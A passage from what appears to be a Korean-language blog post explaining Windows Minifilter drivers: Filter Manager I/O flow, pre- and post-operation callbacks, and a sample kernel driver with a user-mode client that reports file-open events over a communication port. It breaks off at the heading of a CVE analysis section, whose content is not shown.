I/O</li><li>File System Filter Callbacks</li></ol><h2 id="1-1-Filter-Manager-&#x2192;-Minifilter-&#xD750;&#xB984;"><a href="#1-1-Filter-Manager-&#x2192;-Minifilter-&#xD750;&#xB984;" class="headerlink" title="1.1 Filter Manager &#x2192; Minifilter &#xD750;&#xB984;"></a>1.1 Filter Manager &#x2192; Minifilter &#xD750;&#xB984;</h2><p>Minifilter&#xB294; Windows&#xC758; Filter Manager(<code>fltmgr.sys</code>) &#xC704;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. Filter Manager&#xB294; I/O Manager&#xB85C;&#xBD80;&#xD130; &#xC804;&#xB2EC;&#xB41C; &#xD30C;&#xC77C; I/O &#xC694;&#xCCAD;&#xC744;, &#xB4F1;&#xB85D;&#xB41C; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xAC8C; Altitude &#xC21C;&#xC11C;&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, Altitude&#xB97C; &#xD1B5;&#xD574; &#xB85C;&#xB529; &#xC21C;&#xC11C;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image2.gif" alt></p><p>Windows&#xC5D0;&#xC11C; &#xD30C;&#xC77C; I/O &#xC694;&#xCCAD;&#xC774; &#xCC98;&#xB9AC;&#xB418;&#xB294; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><ol><li>&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; <code>CreateFile</code>, <code>ReadFile</code>, <code>WriteFile</code>&#xAC19;&#xC740; API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; I/O &#xC791;&#xC5C5;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>I/O Manager&#xC774; &#xC774; &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC544; Filter Manager(<code>fltmgr.sys</code>)&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Filter Manager&#xB294; &#xB4F1;&#xB85D;&#xB41C; &#xBAA8;&#xB4E0; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xBAA9;&#xB85D;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0;, Altitude &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xAC01; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Minifilter&#xC774; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD55C; &#xB4A4;, &#xC694;&#xCCAD;&#xC740; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; Filter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC694;&#xCCAD;&#xC740; &#xB514;&#xC2A4;&#xD06C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;(Storage Driver Stack)&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xC5B4; &#xC2E4;&#xC81C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC70;&#xB098; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image3.png" alt></p><p>&#xCC38;&#xACE0;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; Minifilter &#xBAA9;&#xB85D;&#xC740; cmd&#xCC3D;&#xC758; fltmc &#xBA85;&#xB839;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Altitude &#xAC12;&#xC774; &#xB192;&#xC744;&#xC218;&#xB85D; &#xC6B0;&#xC120;&#xC21C;&#xC704;&#xAC00; &#xB192;&#xC544;&#xC838; I/O &#xC694;&#xCCAD;&#xC744; &#xBA3C;&#xC800; &#xAC00;&#xB85C;&#xCC44;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E8;, &#xCC98;&#xB9AC; &#xC21C;&#xC11C;&#xB294; &#xC0AC;&#xC804; &#xC5F0;&#xC0B0;, &#xC0AC;&#xD6C4; &#xC5F0;&#xC0B0;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xC0AC;&#xC804; &#xC5F0;&#xC0B0;(Pre-operation)</strong>: Altitude&#xAC00; <strong>&#xB192;&#xC740; &#xC21C;&#xC11C; &#x2192; &#xB0AE;&#xC740; &#xC21C;&#xC11C;</strong>&#xB85C; &#xD638;&#xCD9C;</li><li><strong>&#xC0AC;&#xD6C4; &#xC5F0;&#xC0B0;(Post-operation)</strong>: Altitude&#xAC00; <strong>&#xB0AE;&#xC740; &#xC21C;&#xC11C; &#x2192; &#xB192;&#xC740; &#xC21C;&#xC11C;</strong>&#xB85C; &#xD638;&#xCD9C;</li></ul><blockquote><p>&#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xC640; &#xC704; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;&#x2026; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xAE30;&#xC874;&#xC758; &#xBC29;&#xC2DD;&#xCC98;&#xB7FC; IRP&#xB97C; &#xC9C1;&#xC811; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0;, FilterManager&#xAC00; I/O &#xC694;&#xCCAD;&#xC744; &#xB300;&#xC2E0; &#xBC1B;&#xC544;&#xC11C; Minifilter&#xC5D0;&#xAC8C; &#xCF5C;&#xBC31; &#xD568;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC2DC;&#xB9D0;&#xD574; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC6B0;&#xB9AC;&#xAC00; &#xD754;&#xD788; &#xC54C;&#xACE0;&#xC788;&#xB294; <strong>DispatchRoutine&#xC744; &#xC124;&#xC815;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xB294; &#xAC83;&#xC774;&#xC8E0;!</strong></p></blockquote><h2 id="1-2-Minifilter-Callback-Routine"><a href="#1-2-Minifilter-Callback-Routine" class="headerlink" title="1.2 Minifilter Callback Routine"></a>1.2 Minifilter Callback Routine</h2><p>Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xD2B9;&#xC815; &#xD30C;&#xC77C; &#xC791;&#xC5C5;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? &#xC774;&#xB294; &#xCF5C;&#xBC31;(Callback)&#xC774;&#xB77C;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xB355;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <strong>DispatchRoutine</strong>&#xC744; &#xD1B5;&#xD574; IRP&#xB97C; &#xC9C1;&#xC811; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xACE0; &#xD588;&#xC8E0;? &#xADF8; &#xB300;&#xC2E0;, Filter Manager&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xB2EC;&#xB418;&#xB294; I/O &#xC694;&#xCCAD;&#xC5D0; &#x201C;&#xD6C5;(hook)&#x201D;&#xC744; &#xAC78; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Minifilter&#xB294; &#xC774; &#xC694;&#xCCAD;&#xB4E4;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; <strong>&#xC0AC;&#xC804; &#xCF5C;&#xBC31;(<code>PreOperation Callback</code>)</strong>&#xACFC; <strong>&#xC0AC;&#xD6C4; &#xCF5C;&#xBC31;(<code>PostOperation Callback</code>)</strong>&#xC744; &#xB4F1;&#xB85D;&#xD558;&#xC5EC;, &#xAC10;&#xC2DC;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; I/O &#xC791;&#xC5C5;&#xC744; &#xC2DC;&#xC2A4;&#xD15C; &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xAD00;&#xCC30;&#xD558;&#xAC70;&#xB098; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xC0AC;&#xC804; &#xC791;&#xC5C5; &#xCF5C;&#xBC31; (<code>PFLT_PRE_OPERATION_CALLBACK</code>)</strong></li></ul><pre><code class="hljs c">PFLT_PRE_OPERATION_CALLBACK PfltPreOperationCallback;<span class="hljs-function">FLT_PREOP_CALLBACK_STATUS <span class="hljs-title">PfltPreOperationCallback</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, out] PFLT_CALLBACK_DATA Data,</span></span><span class="hljs-function"><span class="hljs-params">  [in]      PCFLT_RELATED_OBJECTS FltObjects,</span></span><span class="hljs-function"><span class="hljs-params">  [out]     PVOID *CompletionContext</span></span><span class="hljs-function"><span class="hljs-params">)</span></span><span class="hljs-function"></span>{...}</code></pre><p>I/O &#xC694;&#xCCAD;&#xC774; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC774;&#xB098; &#xD558;&#xC704; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xAE30; &#xC774;&#xC804;&#xC5D0; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. Minifilter&#xC758; &#xD575;&#xC2EC; &#xB85C;&#xC9C1;&#xC774; &#xC218;&#xD589;&#xB418;&#xB294; &#xACF3;&#xC73C;&#xB85C; <code>FLT_PREOP_COMPLETE</code>, <code>FLT_PREOP_SUCCESS_WITH_CALLBACK</code>, <code>FLT_PREOP_SUCCESS_NO_CALLBACK</code>&#xACFC; &#xAC19;&#xC740; &#xAC15;&#xB825;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_pre_operation_callback"><strong>PFLT_PRE_OPERATION_CALLBACK callback function (fltkernel.h)</strong></a></p><ul><li><strong>&#xC0AC;&#xD6C4; &#xC791;&#xC5C5; &#xCF5C;&#xBC31; (<code>PFLT_POST_OPERATION_CALLBACK</code>)</strong></li></ul><pre><code class="hljs c">PFLT_POST_OPERATION_CALLBACK PfltPostOperationCallback;<span class="hljs-function">FLT_POSTOP_CALLBACK_STATUS <span class="hljs-title">PfltPostOperationCallback</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, out]      PFLT_CALLBACK_DATA Data,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           PCFLT_RELATED_OBJECTS FltObjects,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] PVOID CompletionContext,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           FLT_POST_OPERATION_FLAGS Flags</span></span><span class="hljs-function"><span class="hljs-params">)</span></span><span class="hljs-function"></span>{...}</code></pre><p>I/O &#xC694;&#xCCAD;&#xC774; &#xD558;&#xC704; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB97C; &#xBAA8;&#xB450; &#xB9C8;&#xCE58;&#xACE0; &#xB3CC;&#xC544;&#xC624;&#xB294; &#xAE38;&#xC5D0; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC791;&#xC5C5;&#xC758; &#xC131;&#xACF5; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098;, &#xACB0;&#xACFC;&#xB97C; &#xB85C;&#xAE45;&#xD558;&#xAC70;&#xB098;, &#xD544;&#xC694;&#xD558;&#xB2E4;&#xBA74; &#xC791;&#xC5C5; &#xACB0;&#xACFC;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xD6C4;&#xCC98;&#xB9AC; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.<br><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_post_operation_callback"><strong>PFLT_POST_OPERATION_CALLBACK callback function (fltkernel.h)</strong></a></p><blockquote><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, &#xC774; &#xCF5C;&#xBC31;&#xB4E4;&#xC740; <code>FLT_OPERATION_REGISTRATION</code>&#xC774;&#xB77C;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#x201C;&#xC5B4;&#xB5A4; I/O &#xC791;&#xC5C5;(MajorFunction)&#xC5D0; &#xC5B4;&#xB5A4; &#xC0AC;&#xC804;/&#xC0AC;&#xD6C4; &#xCF5C;&#xBC31; &#xD568;&#xC218;&#xB97C; &#xC5F0;&#xACB0;&#xD560;&#xC9C0;&#x201D;&#xB97C; &#xBA85;&#xC2DC;&#xD574; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><h2 id="1-3-Minifilter&#xC640;-User-Mode-&#xAC04;&#xC758;-&#xD1B5;&#xC2E0;"><a href="#1-3-Minifilter&#xC640;-User-Mode-&#xAC04;&#xC758;-&#xD1B5;&#xC2E0;" class="headerlink" title="1.3 Minifilter&#xC640; User-Mode &#xAC04;&#xC758; &#xD1B5;&#xC2E0;"></a>1.3 Minifilter&#xC640; User-Mode &#xAC04;&#xC758; &#xD1B5;&#xC2E0;</h2><p>Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; User-Mode &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC740; <strong>&#xD544;&#xD130; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;</strong>&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xB780;, Minifilter&#xC640; &#xC571; &#xC0AC;&#xC774;&#xC758; &#xC804;&#xC6A9; &#xACE0;&#xC18D; &#xD1B5;&#xC2E0; &#xCC44;&#xB110;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD3EC;&#xD2B8;&#xB294; Kernel Mode &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; User-Mode &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04;&#xC758; &#xC548;&#xC804;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0; &#xC804;&#xB2EC;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA70; Microsoft&#xAC00; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC5EC;&#xB7EC; API&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><h3 id="Driver-Code"><a href="#Driver-Code" class="headerlink" title="Driver Code"></a>Driver Code</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fltKernel.h&gt;</span></span>PFLT_FILTER gFilter = <span class="hljs-literal">NULL</span>;PFLT_PORT gServerPort = <span class="hljs-literal">NULL</span>, gClientPort = <span class="hljs-literal">NULL</span>;<span class="hljs-function">VOID <span class="hljs-title">OnDisconnect</span><span class="hljs-params">(PVOID Cookie)</span> </span>{    UNREFERENCED_PARAMETER(Cookie);    FltCloseClientPort(gFilter, &amp;gClientPort);    gClientPort = <span class="hljs-literal">NULL</span>;}<span class="hljs-function">NTSTATUS <span class="hljs-title">OnConnect</span><span class="hljs-params">(PFLT_PORT ClientPort, PVOID SrvCookie, PVOID Ctx, ULONG Size, PVOID* ConnCookie)</span> </span>{    UNREFERENCED_PARAMETER(SrvCookie);    UNREFERENCED_PARAMETER(Ctx);    UNREFERENCED_PARAMETER(Size);    UNREFERENCED_PARAMETER(ConnCookie);    gClientPort = ClientPort;    <span class="hljs-keyword">return</span> STATUS_SUCCESS;}<span class="hljs-function">FLT_PREOP_CALLBACK_STATUS <span class="hljs-title">PreCreate</span><span class="hljs-params">(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* Buff)</span> </span>{    UNREFERENCED_PARAMETER(FltObjects);    UNREFERENCED_PARAMETER(Buff);    PFLT_FILE_NAME_INFORMATION nameInfo;    <span class="hljs-keyword">if</span> (gClientPort &amp;&amp; NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &amp;nameInfo))) {        FltSendMessage(gFilter, &amp;gClientPort, nameInfo-&gt;Name.Buffer, nameInfo-&gt;Name.Length, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);        FltReleaseFileNameInformation(nameInfo);    }    <span class="hljs-keyword">return</span> FLT_PREOP_SUCCESS_NO_CALLBACK;}<span class="hljs-function">NTSTATUS <span class="hljs-title">Unload</span><span class="hljs-params">(FLT_FILTER_UNLOAD_FLAGS Flags)</span> </span>{    UNREFERENCED_PARAMETER(Flags);    FltCloseCommunicationPort(gServerPort);    FltUnregisterFilter(gFilter);    <span class="hljs-keyword">return</span> STATUS_SUCCESS;}<span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> </span>{    UNREFERENCED_PARAMETER(RegistryPath);    NTSTATUS status;    <span class="hljs-keyword">const</span> FLT_OPERATION_REGISTRATION Cbs[] = { { IRP_MJ_CREATE, <span class="hljs-number">0</span>, PreCreate, <span class="hljs-literal">NULL</span> }, { IRP_MJ_OPERATION_END } };    <span class="hljs-keyword">const</span> FLT_REGISTRATION Reg = { <span class="hljs-keyword">sizeof</span>(FLT_REGISTRATION), FLT_REGISTRATION_VERSION, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, Cbs, Unload };    status = FltRegisterFilter(DriverObject, &amp;Reg, &amp;gFilter);    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) <span class="hljs-keyword">return</span> status;    UNICODE_STRING portName = RTL_CONSTANT_STRING(<span class="hljs-string">L&quot;\\FileActivityMonitorPort&quot;</span>);    OBJECT_ATTRIBUTES oa = { <span class="hljs-keyword">sizeof</span>(oa), <span class="hljs-literal">NULL</span>, &amp;portName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, <span class="hljs-literal">NULL</span> };    status = FltCreateCommunicationPort(gFilter, &amp;gServerPort, &amp;oa, <span class="hljs-literal">NULL</span>, OnConnect, OnDisconnect, <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {        FltUnregisterFilter(gFilter);        <span class="hljs-keyword">return</span> status;    }    <span class="hljs-keyword">return</span> FltStartFiltering(gFilter);}</code></pre><p>&#xB300;&#xD45C;&#xC801;&#xC778; Driver Code API&#xC778; <code>FltCreateCommunicationPort()</code>, <code>FltSendMessage()</code>, <code>FltCloseCommunicationPort()</code>&#xC5D0; &#xCD08;&#xC810;&#xC744; &#xB9DE;&#xCDB0;&#xC11C; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCF54;&#xB4DC;&#xB97C; &#xC608;&#xC81C;&#xB85C; &#xAD6C;&#xD604;&#xD574;&#xBCF4;&#xC558;&#xB294;&#xB370;&#xC694;. &#xD750;&#xB984;&#xC744; &#xD568;&#xAED8; &#xC0B4;&#xD3B4;&#xBCFC;&#xAE4C;&#xC694;?</p><ol><li>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <code>FltRegisterFilter()</code>&#xB97C; &#xD1B5;&#xD574; &#xC790;&#xC2E0;&#xC744; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD30C;&#xC77C; &#xC0DD;&#xC131;&#xACFC; &#xC5F4;&#xAE30;(<code>IRP_MJ_CREATE</code>) &#xC694;&#xCCAD;&#xC744; &#xAC10;&#xC2DC;&#xD560; PreCreateCallback &#xD568;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xACE0;, <code>FltStartFiltering()</code>&#xC73C;&#xB85C; I/O &#xAC10;&#xC2DC;&#xB97C; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>FltCreateCommunicationPort()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, &#xC704;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; User-Mode &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC5F0;&#xACB0;&#xD558;&#xACE0; &#xC54C;&#xB9BC;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8; <code>\\FileActivityMonitorPort</code>&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB9CC;&#xC57D; &#xD30C;&#xC77C; &#xC0DD;&#xC131;/&#xC5F4;&#xAE30; &#xC774;&#xBCA4;&#xD2B8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; PreCreateCallback&#xC774; &#xD638;&#xCD9C;&#xB418;&#xACE0;, &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xC5B4;&#xB5A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD588;&#xB294;&#xC9C0; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4; <code>FltSendMessage()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; PreCreateCall&#xC5D0;&#xC11C; &#xC218;&#xC9D1;&#xD55C; &#xC2E4;&#xC2DC;&#xAC04; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC815;&#xBCF4;&#xB97C; &#xC5F0;&#xACB0;&#xB418;&#xC5B4;&#xC788;&#xB294; User-Mode &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC73C;&#xB85C; &#xC989;&#xC2DC; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; FilterUnload &#xC5B8;&#xB85C;&#xB4DC; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC885;&#xB8CC;&#xB420; &#xB54C;, &#xC5F4;&#xC5C8;&#xB358; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xB97C; <code>FltCloseCommunicationPort()</code>&#xB85C; &#xB2EB;&#xACE0; &#xD544;&#xD130; &#xB4F1;&#xB85D;&#xC744; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><h3 id="User-Mode-Application-Code"><a href="#User-Mode-Application-Code" class="headerlink" title="User-Mode Application Code"></a>User-Mode Application Code</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fltuser.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;fltlib.lib&quot;</span>)</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    HANDLE port;    HRESULT hr;        BYTE buffer[<span class="hljs-keyword">sizeof</span>(FILTER_MESSAGE_HEADER) + <span class="hljs-number">1024</span>];    PFILTER_MESSAGE_HEADER header = (PFILTER_MESSAGE_HEADER)buffer;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connecting to driver...\n&quot;</span>);    hr = FilterConnectCommunicationPort(<span class="hljs-string">L&quot;\\FileActivityMonitorPort&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, &amp;port);    <span class="hljs-keyword">if</span> (IS_ERROR(hr)) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection failed. Error 0x%X\n&quot;</span>, hr);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected. Waiting for file events...\n&quot;</span>);    <span class="hljs-keyword">while</span> (TRUE) {        hr = FilterGetMessage(port, header, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-literal">NULL</span>);                <span class="hljs-keyword">if</span> (SUCCEEDED(hr)) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;File Accessed: %S\n&quot;</span>, (PWSTR)header-&gt;MessageBody);        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection lost. Error 0x%X\n&quot;</span>, hr);            <span class="hljs-keyword">break</span>;        }    }    CloseHandle(port);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xC81C; User-Mode &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xD1B5;&#xC2E0; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xB300;&#xD45C;&#xC801;&#xC778; API&#xB85C; <code>FilterConnectCommunicationPort()</code>, <code>FilterSendMessage()</code>&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xBA3C;&#xC800; <code>FilterConnectCommunicationPort()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCEE4;&#xB110;&#xC5D0; &#xC788;&#xB294; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xC778; <code>\\FileActivityMonitorPort</code>&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xACE0; &#xD1B5;&#xC2E0;&#xC744; &#xC704;&#xD55C; HANDLE&#xC744; &#xC5BB;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xADF8; &#xD6C4; <code>FilterGetMessage()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC;, &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C;&#xBD80;&#xD130; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC9C1;&#xC811; &#xC218;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xC2E0;&#xB418;&#xBA74; &#xD574;&#xB2F9; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><h1 id="2-CVE-2024-30085-1-Day-Analysis"><a href="#2-CVE-2024-30085-1-Day-Analysis" class="headerlink" title="2. [CVE-2024-30085] 1-Day Analysis"></a>2. [CVE-2024-30085] 1-Day Analysis</h1><hr><p>&#xD558;&#xB8E8;&#xD55C;&#xC904;&#xC5D0;&#xB3C4; 